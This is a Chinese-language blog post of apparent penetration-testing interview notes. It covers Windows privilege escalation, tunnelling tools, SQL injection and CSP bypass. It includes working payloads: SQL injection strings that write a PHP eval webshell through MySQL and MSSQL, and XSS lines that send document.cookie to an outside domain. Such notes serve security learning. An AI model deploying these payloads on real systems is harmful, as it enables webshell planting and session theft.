<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="windows上的提权方式内核提权Windows内核溢出漏洞提权通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限。github上windows系统溢出漏洞提权的汇总：ht">
<meta property="og:type" content="article">
<meta property="og:title" content="面试题">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2021&#x2F;08&#x2F;16&#x2F;%E9%9D%A2%E8%AF%95%E9%A2%98&#x2F;index.html">
<meta property="og:site_name" content="irrik&#39;s Blog">
<meta property="og:description" content="windows上的提权方式内核提权Windows内核溢出漏洞提权通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限。github上windows系统溢出漏洞提权的汇总：ht">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;08&#x2F;18&#x2F;XjrUSYopftmRJ1E.png">
<meta property="og:updated_time" content="2021-11-04T01:53:49.658Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;08&#x2F;18&#x2F;XjrUSYopftmRJ1E.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2021/08/16/面试题/"/>





  <title>面试题 | irrik's Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">irrik's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">夏天要过去了</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/08/16/%E9%9D%A2%E8%AF%95%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="irrik">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="irrik's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">面试题</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-16T10:30:39+08:00">
                2021-08-16
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  18.5k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  69
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h2 id="windows上的提权方式"><a href="#windows上的提权方式" class="headerlink" title="windows上的提权方式"></a>windows上的提权方式</h2><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><pre><code>Windows内核溢出漏洞提权通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限</code></pre><p>本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限。<br>github上windows系统溢出漏洞提权的汇总：<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p>
<p>实战中最常用的本地溢出提权有 CVE-2018-8120、MS16-032、MS15-051 和 MS14-058 。<br>在MSF中，最常用的提权模块是CVE-2018-8120；<br>在CobaltStrike中，最常用的提权模块的是 MS14-058。这四个提权，都有对应的exe程序。exe程序均支持32和64位的机器。</p>
<p><strong>手工查找补丁情况</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB4131188&quot;  #直接找是否存在cve-2018-8120对应的KB4131188补丁</span><br></pre></td></tr></table></figure>
<p>WMIC是Windows Management Instrumentation Command-line的简称</p>
<h3 id="系统配置错误提权"><a href="#系统配置错误提权" class="headerlink" title="系统配置错误提权"></a>系统配置错误提权</h3><p>Windows在系统启动时，会伴随着一些高权服务启动(windows服务是以system权限运行的)倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持，例如DLL劫持</p>
<h4 id="系统服务权限配置错误"><a href="#系统服务权限配置错误" class="headerlink" title="系统服务权限配置错误"></a>系统服务权限配置错误</h4><p>windows系统服务文件在操作系统启动时加载执行，并在后台调用可执行文件。如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，那么就可以替换该文件，并随着系统启动获得控制权限。<br>windows服务是以system权限运行的，其文件夹、文件和注册表key-value都是受强制访问控制保护的。但是在某些情况下，操作系统中依然存在一些没有得到有效保护的服务。<br>利用方式：<br>1.Powershell中的PowerUp脚本<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1</a><br>加载模块并执行 列出可能存在问题的所有服务<br>分析能否利用</p>
<p>2.Metasploit中的攻击模块<br>exploit/windows/local/service_permissions<br>service_permissions模块会使用 两种方式获取system权限<br>如果以管理员权限运行 会尝试创建并运行一个新的服务<br>如果当前权限不允许创建服务 会判断哪些服务的文件或文件夹的权限有问题 并对其进行劫持<br>在劫持服务时会创建一个可执行程序 其文件名和安装路径都是随机的</p>
<h4 id="注册表键alwaysinstallelevated"><a href="#注册表键alwaysinstallelevated" class="headerlink" title="注册表键alwaysinstallelevated"></a>注册表键alwaysinstallelevated</h4><p>允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NT Authority\System权限来安装恶意的MSI文件。<br>windows install是windows操作系统的组件之一，专门用来管理配置软件服务。它除了是一个安装程序，还用于管理软件的安装、组件的添加、删除、监视文件的还原、通过回滚进行灾难恢复。windows install通过msiexec.exe安装MSI文件，双击MSI文件就会运行msiexec.exe。<br>原理:是因为用户打开了windows installer 特权安装功能<br>利用方式<br>1.powerup下的Get-RegistryAlwaysInstallElevated模块检查注册表键是否被设置<br>如果被设置则意味MSI文件是以system权限下能运行<br>2.Metasploit的exploit/windows/local/always_install_elevated模块<br>该模块会创建一个文件名随机的MSI文件 并在提权后删除所有已部署的文件</p>
<h4 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h4><h4 id="自动安装配置文件"><a href="#自动安装配置文件" class="headerlink" title="自动安装配置文件"></a>自动安装配置文件</h4><p>网络管理员在内网中给多台机器配置同一个环境时，通常不会逐个配置，而是使用脚本批量部署。<br>在这个过程中，会使用安装配置文件。这些文件中包含所有的安装配置信息，其中一些还可能包含管理员账号和密码。<br>Metasploit集成了漏洞利用模块<br>post/windows/gather/enum_unattend</p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>可以使用如下命令查看计算机计划任务<br>schtasks /query /fo LIST /v</p>
<h3 id="组策略首选项提权-SYSVOL-GPP"><a href="#组策略首选项提权-SYSVOL-GPP" class="headerlink" title="组策略首选项提权(SYSVOL/GPP)"></a>组策略首选项提权(SYSVOL/GPP)</h3><p>SYSVOL是活动目录里面的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控制器之间进行复制。<br>SYSVOL文件夹是在安装活动目录时自动创建的，主要用来存放登录脚本、组策略数据及其他域控制器需要的域信息等。<br>SYSVOL在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录的域范围内共享。<br>整个SYSVOL目录在所有的域控制器中是自动同步和共享的，所有的域策略均存放在 C:Windows/SYSVOL/DOMAIN/Policies 目录中。</p>
<h3 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h3><p>UAC(User Account Control，用户账号控制)是微软为了提高系统安全性在Windows Vista中引入的技术。</p>
<h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><h2 id="渗透中，正向代理和反向代理隧道，使用什么工具"><a href="#渗透中，正向代理和反向代理隧道，使用什么工具" class="headerlink" title="渗透中，正向代理和反向代理隧道，使用什么工具"></a>渗透中，正向代理和反向代理隧道，使用什么工具</h2><p>为什么需要做正向代理？</p>
<p>我们把这台服务器作为我们访问内网的代理，然后用自己的主机进行操作，省去环境配置等问题，在本机上操作更简单省心。<br>这台跳板主机和日常的正向代理没什么不同，只是代理访问目标变成了内网机器而已。</p>
<h3 id="HTTP-S-隧道"><a href="#HTTP-S-隧道" class="headerlink" title="HTTP(S) 隧道"></a>HTTP(S) 隧道</h3><p><strong>reGeorg</strong><br>1.获得目标机器webshell权限后，往目标机器上传对应脚本语言的代理脚本，支持php，asp，jsp，aspx<br>2.本地攻击机用python2运行reGeorgSocksProxy.py -u http://目标机ip/上传的脚本 -p 端口<br>程序卡在“Georg says, ‘All seems fine’“说明正常运行<br>3.我是用的是windows，所以下载proxifier将软件流量代理到指定端口。<br>创建一个代理服务器，配置的端口要和上面运行脚本的时候指定的端口一样。<br>进入代理规则部分，选择要代理的软件，然后将流量代理到刚才创建的服务器即可。</p>
<h3 id="Socks隧道"><a href="#Socks隧道" class="headerlink" title="Socks隧道"></a>Socks隧道</h3><p>Earthworm简称EW 是一套便携式的网络穿透工具，具有SOCKSv5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。<br>该工具能够以”正向”、”反向”、”多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。<br>支持 Linux、Windows、MacOS、Arm-Linux 均被包括其内，建议使用EW。</p>
<p>使用正向代理需要跳板机存在公网ip。原理和一般正向代理没啥差别</p>
<p>反向代理，适用于跳板机没有公网ip（比如通过NAT访问的）。<br>在自己的vps上监听某个端口(例如9999）然后转发给另一个端口(例如10000)处理<br>在跳板机上反弹一个连接到vps上。<br>在本地攻击机将vps作为一个正向代理使用。</p>
<h3 id="内网穿透工具"><a href="#内网穿透工具" class="headerlink" title="内网穿透工具"></a>内网穿透工具</h3><p>ngrok<br>ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。<br>ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。<br>反向代理在计算机网络中是代理服务器的一种。<br>服务器根据客户端的请求，从其关系的一组或多组后端服务器（如Web服务器）上获取资源，然后再将这些资源返回给客户端，<br>客户端只会得知反向代理的IP地址，而不知道在代理服务器后面的服务器集群的存在。</p>
<p>frp<br>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。<br>(1):首先启动frpc，frpc启动后会向frps注册，也就是内网WEB服务器会向VPS请求注册。</p>
<p>(2):客户端请求frps，也就是当我们的攻击机去访问frps。</p>
<p>(3):frps告知frpc有新请求，需要建立连接，也就是VPS告知内网WEB服务器，需要建立连接。</p>
<p>(4):frps收到frpc的请求，建立新的连接，也就是VPS接收到了内网WEB服务器的请求，建立了新的连接。</p>
<p>(5):frps吧frpc和攻击机的流量互相转发，将frps服务器当成流量中转站，也就是VPS将攻击机的流量转发给内网WEB服务器，把内网WEB服务器的流量转发给攻击机。</p>
<h2 id="SQL注入WAF的绕过方法"><a href="#SQL注入WAF的绕过方法" class="headerlink" title="SQL注入WAF的绕过方法"></a>SQL注入WAF的绕过方法</h2><ol>
<li>利用waf的规则漏洞绕过</li>
<li>利用web容器和waf的解析差异绕过，比如web容器能正常识别解析，但是waf不能正常识别解析</li>
<li>利用数据库和waf的解析差异绕过，最常见的是一些换行注释绕过</li>
<li>利用waf的特性绕过，比如软件waf一般难以处理大量的请求数据，所以大部分情况下会尝试用脏数据绕过</li>
</ol>
<h2 id="MYSQL写webshell需要哪些条件"><a href="#MYSQL写webshell需要哪些条件" class="headerlink" title="MYSQL写webshell需要哪些条件"></a>MYSQL写webshell需要哪些条件</h2><ol>
<li>数据库当前用户为root或者拥有file权限</li>
<li>知道网站目录的绝对路径</li>
<li>PHP的GPC参数为off状态（php5.329之后就没有magic_quotes_gpc）</li>
<li>MYSQL中的secure_file_priv参数不能为null状态，有值或者为空都可以<br>（如果为null那么outfile写shell方式不行，但是还可以通过日志的方法getshell）</li>
</ol>
<p>当满足上述条件，如果可以使用联合注入，当然很容易就可以union select payload into outfile path<br>当无法使用联合注入的时候，可以使用分隔符注入的方法来实现写shell，当然，还是要知道绝对路径才好操作<br>分隔符写shell一般有四种方法，分别是</p>
<p>?id=1 INTO OUTFILE ‘物理路径’ lines terminatedby （这里是WebShell）#</p>
<p>?id=1 INTO OUTFILE ‘物理路径’ fields terminatedby （这里是WebShell）#</p>
<p>?id=1 INTO OUTFILE’物理路径’columns terminatedby （这里是WebShell）#</p>
<p>?id=1 INTO OUTFILE ‘物理路径’ lines startingby （这里是WebShell）#<br>顺带一提，上面的#是mysql注释符</p>
<h2 id="phpmyadmin-getshell-方式"><a href="#phpmyadmin-getshell-方式" class="headerlink" title="phpmyadmin getshell 方式"></a>phpmyadmin getshell 方式</h2><ol>
<li>INTO OUTFILE 写webshell</li>
<li>利用MYSQL5.0以上版本的日志功能尝试写shell</li>
<li>利用phpmyadmin4.8.x本地文件包含漏洞getshell，查看自己的sesionid（cookie中），对应的session文件为/tmp/sess_sessionid</li>
</ol>
<h2 id="sqlserver写webshell需要哪些条件"><a href="#sqlserver写webshell需要哪些条件" class="headerlink" title="sqlserver写webshell需要哪些条件"></a>sqlserver写webshell需要哪些条件</h2><ol>
<li>有相应的db_owner</li>
<li>知道web目录的绝对路径</li>
</ol>
<p>向MSSQL写入WebShell的方法一共有三种：<br>利用xp_cmdshell命令、差异备份写入shell、log备份写入shell</p>
<h3 id="利用xp-cmdshell写shell"><a href="#利用xp-cmdshell写shell" class="headerlink" title="利用xp_cmdshell写shell"></a>利用xp_cmdshell写shell</h3><p>首先我们需要查找网站目录的绝对路径，查找绝对路径的方法有5种：</p>
<p>通过报错信息查找；<br>通过目录爆破猜解；<br>通过旁站的目录确定；<br>通过存储过程来搜索；<br>通过读取配置文件查找。</p>
<p>其中通过存储过程来搜索有xp_cmdshell和xp_dirtree两种方式<br>execute master..xp_dirtree ‘c:’; 可以查出所有c:\下的文件、目录、子目录。<br>在真实环境中时，我们执行execute可能并不能得到回显信息，但我们可以在注入点处新建一张表，<br>然后将xp_dirtree查询到的信息插入其中，再查询这张表即可得相应的绝对路径了。</p>
<p>Xp_cmdshell是一个更为有效的查询绝对路径的函数，但是目前已经被SQLServer默认关闭了，<br>但我们可以使用如下命令启用这个选项。</p>
<p>EXEC sp_configure ‘show advanced options’,1;//允许修改高级参数RECONFIGURE;</p>
<p>EXEC sp_configure ‘xp_cmdshell’,1; //打开xp_cmdshell扩展RECONFIGURE;–</p>
<p>使用xp_cmdshell写入WebShell<br>我们可以通过xp_cmdshell执行系统CMD命令，例如我们可以使用CMD中的echo命令，将WebShell的代码写入到网站目录下，所以我们必须提前知道Web目录的绝对路径。</p>
<p>PAYLOAD：1’;exec master..xp_cmdshell’echo^&lt;?phpeval($_POST[“pass”]);?^&gt;&gt;F:\PhpStudy20180211\PHPTutorial\WWW\cmd.php’;</p>
<h3 id="使用差异备份写入WebShell"><a href="#使用差异备份写入WebShell" class="headerlink" title="使用差异备份写入WebShell"></a>使用差异备份写入WebShell</h3><p>先对数据库进行备份 PAYLOAD：id = 1’;backup database 库名 to disk = ‘F:\PhpStudy20180211\PHPTutorial\WWW\back.bak’;<br>在数据库中新建一张表，然后往里写payload<br>PAYLOAD：id = 1’; create table cybk([cmd] [image]);#创建一个新表</p>
<p>PAYLOAD：id=1’;insertintocybk(cmd) vaues(0x3C3F706870206576616C28245F504F53545B2770617373275D293B203F3E);#将WebShell的代码转换成ASCII码<br>最后将此数据库进行差异备份，这样其中就会包含刚刚写入的WebShell代码。<br>PAYLOAD：id=1’; backup database library todisk=’F:\PhpStudy20180211\PHPTutorial\WWW\cybk.php’ WITHDIFFERENTIAL,FORMAT;</p>
<h3 id="使用log备份写入WebShell"><a href="#使用log备份写入WebShell" class="headerlink" title="使用log备份写入WebShell"></a>使用log备份写入WebShell</h3><p>使用Log备份写入WebShell的要求是他的数据库已经备份过，而且要选择完整模式的恢复模式，相比较差异备份而言，使用Log备份文件会小的多。<br>首先需要将数据库设置为完整恢复模式，然后创建一个新表，将WebShell用Ascii编码后写入其中，然后将该数据库的日志信息导出到Web目录，即可。</p>
<p>alter database library set RECOVERY FULL;<br>create table logbk([cmd] [image]);<br>inseert into logbk(cmd) values(0x3C3F706870206576616C28245F504F53545B2770617373275D293B203F3E);<br>backup log library to disk = path</p>
<h2 id="如果不是默认路径，怎么去获取写shell的路径"><a href="#如果不是默认路径，怎么去获取写shell的路径" class="headerlink" title="如果不是默认路径，怎么去获取写shell的路径"></a>如果不是默认路径，怎么去获取写shell的路径</h2><ol>
<li>扫描一下有没有phpinfo</li>
<li>找一下有没有模块文件出错然后爆出绝对路径的地方。有些环境下就有这种问题。<br>mssql下：</li>
<li>利用xp_cmdshell执行命令，搜索特定文件找到web路径</li>
<li>利用xp_dirtree来确定目录结构，找到web路径<br>mysql下：</li>
<li>通过select @@datadir;先获取工作目录，再根据常见的web容器目录去猜测web路径</li>
<li>通过show variables like “%plugin%”;查一下插件路径，看看有没有绝对路径在。</li>
</ol>
<h2 id="windows-IIS-php的情况下，存在目录遍历，怎么查看源代码？"><a href="#windows-IIS-php的情况下，存在目录遍历，怎么查看源代码？" class="headerlink" title="windows+IIS+php的情况下，存在目录遍历，怎么查看源代码？"></a>windows+IIS+php的情况下，存在目录遍历，怎么查看源代码？</h2><p>在php文件后加入 ::$DATA,例如 <a href="http://xxx.xx/abc.php::$DATA" target="_blank" rel="noopener">http://xxx.xx/abc.php::$DATA</a></p>
<h2 id="SQL注入获取MYSQL本身路径的函数"><a href="#SQL注入获取MYSQL本身路径的函数" class="headerlink" title="SQL注入获取MYSQL本身路径的函数"></a>SQL注入获取MYSQL本身路径的函数</h2><ol>
<li>select @@datadir;</li>
<li>select @@basedir;</li>
</ol>
<h2 id="SQL注入延时注入，sleep的时候，如何加快延时出结果的速度"><a href="#SQL注入延时注入，sleep的时候，如何加快延时出结果的速度" class="headerlink" title="SQL注入延时注入，sleep的时候，如何加快延时出结果的速度"></a>SQL注入延时注入，sleep的时候，如何加快延时出结果的速度</h2><ol>
<li>利用dns注入，利用条件是一个公网ip和一个域名</li>
<li>减少sleep的时间</li>
<li>使用多线程的方式</li>
</ol>
<h2 id="xss如何绕过CSP"><a href="#xss如何绕过CSP" class="headerlink" title="xss如何绕过CSP"></a>xss如何绕过CSP</h2><p>CSP的实质就是白名单机制，对网站加载或执行的资源进行安全策略的控制。<br>一个CSP头由多组CSP策略组成，中间由分号分隔，如下：</p>
<p>Content-Security-Policy: default-src ‘self’ <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>; script-src ‘unsafe-inline’</p>
<p>策略指令<br>default-src<br>default-src作为所有其他指令的备用，一般来说default-src ‘none’; script-src ‘self’这样的情况就会是script-src遵循self，<br>其他的都会使用none。也就是说，除了被设置的指令以外，其余指令都会被设置为default-src指令所设置的属性。</p>
<p>script-src<br>script-src指令限制了所有js脚本可以被执行的地方，包括通过链接方式加载的脚本url以及所有内联脚本，甚至包括各种方式的引用。<br>其中还有一个很重要的参数叫’unsafe-inline’，如果加上这个参数，就不会阻止内联脚本，但这被认为是不安全的。</p>
<p><a href="https://www.mi1k7ea.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/24/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E5%B0%8F%E7%BB%93/</a></p>
<h3 id="绕过default-src-‘none’"><a href="#绕过default-src-‘none’" class="headerlink" title="绕过default-src ‘none’"></a>绕过default-src ‘none’</h3><p>策略为：Content-Security-Policy: default-src ‘none’;</p>
<p>这种情况下，可以使用meta标签实现跳转：<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=https://www.mi1k7ea.com/x.php?c=[cookie]&quot; &gt;</code></p>
<h3 id="形同虚设的script-src-‘unsafe-inline’"><a href="#形同虚设的script-src-‘unsafe-inline’" class="headerlink" title="形同虚设的script-src ‘unsafe-inline’"></a>形同虚设的script-src ‘unsafe-inline’</h3><p>策略中有一条为：script-src ‘unsafe-inline’; ，这条策略相当于直接让CSP几乎沦陷了大半。</p>
<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location=&quot;https://www.mi1k7ea.com/x.php?c=[cookie]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;window.open(&apos;//www.mi1k7ea.com/?&apos;+escape(document.cookie))&lt;/script&gt;</span><br><span class="line">&lt;script&gt;window.location.href=&apos;https://www.mi1k7ea.com/?cookie=&apos;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>3、绕过xx-src *<br>*号即允许匹配任何URL请求。但一般情况很少会遇到default-src ;或大部分xx-src ;这样的CSP策略，举一个简单的例子：</p>
<p>Content-Security-Policy: default-src ‘none’; connect-src ‘self’; frame-src *; script-src <a href="http://xxxxx/js/" target="_blank" rel="noopener">http://xxxxx/js/</a> ‘nonce-xxx’;<br>font-src <a href="http://xxxx/fonts/" target="_blank" rel="noopener">http://xxxx/fonts/</a> fonts.gstatic.com; style-src ‘self’ ‘unsafe-inline’; img-src ‘self’</p>
<p>很明显地可以找到，frame-src *，其对于iframe的来源并没有做任何限制，当然实际环境可能需要iframe标签来内联来包含别的页面。<br>可以利用CSRF漏洞。这里直接输入<code>&lt;iframe src=&quot;https://www.mi1k7ea.com&quot;&gt;&lt;/iframe&gt;</code>来测试，当然，iframe也可以内嵌外部弹框的JS：</p>
<p>查看页面元素，可以看到iframe内嵌包含进来的是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，其可以正常执行而无视掉script-src <a href="http://xxxxx/js/" target="_blank" rel="noopener">http://xxxxx/js/</a> ‘nonce-xxx’;的CSP策略。</p>
<h3 id="利用link绕过xx-src-self"><a href="#利用link绕过xx-src-self" class="headerlink" title="利用link绕过xx-src self"></a>利用link绕过xx-src self</h3><p>CSP策略中xx-src self的设置能够使大部分的XSS和CSRF都会失效，但link标签的预加载功能可以进行绕过。</p>
<p>在Chrome下，可以使用如下标签发送cookie（最新版Chrome会禁止）：</p>
<p><code>&lt;link rel=&quot;prefetch&quot; href=&quot;https://www.mi1k7ea.com/c.php?c=[cookie]&quot;&gt;</code><br>在Firefox下，可以将cookie作为子域名，用DNS预解析的方式把cookie带出去，查看DNS服务器的日志就能得到cookie：</p>
<p><code>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//[cookie].mi1k7ea.com&quot;&gt;</code></p>
<h3 id="利用iframe绕过"><a href="#利用iframe绕过" class="headerlink" title="利用iframe绕过"></a>利用iframe绕过</h3><p>如果页面A中有CSP限制，但是页面B中没有，同时A和B同源，那么就可以在A页面中包含B页面来绕过CSP：</p>
<iframe src="B"></iframe>

<h3 id="xss弹框函数"><a href="#xss弹框函数" class="headerlink" title="xss弹框函数"></a>xss弹框函数</h3><p>confirm prompt alert</p>
<h2 id="了解JWT吗？"><a href="#了解JWT吗？" class="headerlink" title="了解JWT吗？"></a>了解JWT吗？</h2><p>JWT(JSON Web Token)是一串json格式的字符串，由服务端用加密算法对信息签名<br>来保证其完整性和不可伪造性。Token里可以包含所有必要信息，这样服务端就无需<br>保存任何关于用户或会话的信息。JWT可用于身份认证，会话状态维持，信息交换等</p>
<p>JWT的优点</p>
<ol>
<li>可扩展性好<br>应用程序分布式部署的情况下，session需要做多机数据共享，通常可以存在数据库或者<br>redis里面，jwt不需要。</li>
<li>无状态jwt不在服务端存储任何状态<br>RESTful API的原则之一是无状态，发出请求时，总会返回带参数的响应，不会产生附加影响<br>用户的认证引入这种附加影响，这破坏了这一原则。零我jwt的在何种可以存储一些常用信息<br>用于交换信息，有效地使用JWT，可以降低服务器查询数据库的次数</li>
</ol>
<p>JWT的缺点</p>
<ol>
<li>安全性低<br>由于jwt是使用base64编码的，可以直接解码，因此jwt中不能存储敏感数据</li>
<li>性能差<br>jwt太长，由于是无状态使用jwt，所有的数据都被放到JWT里，如果还要进行一些数据交换<br>会加大载荷，经过编码后的jwt就变得非常长，cookie一般限制大小是4k，可能放不下<br>所以jwt一边放在local storage里面。并且每次用户在系统中的http请求都会把jwt携带在<br>Header里面，http请求的Header可能比Body还要大，而sessionid只是一个很短的字符串<br>所以使用jwt的http请求比使用session的开销大得多</li>
</ol>
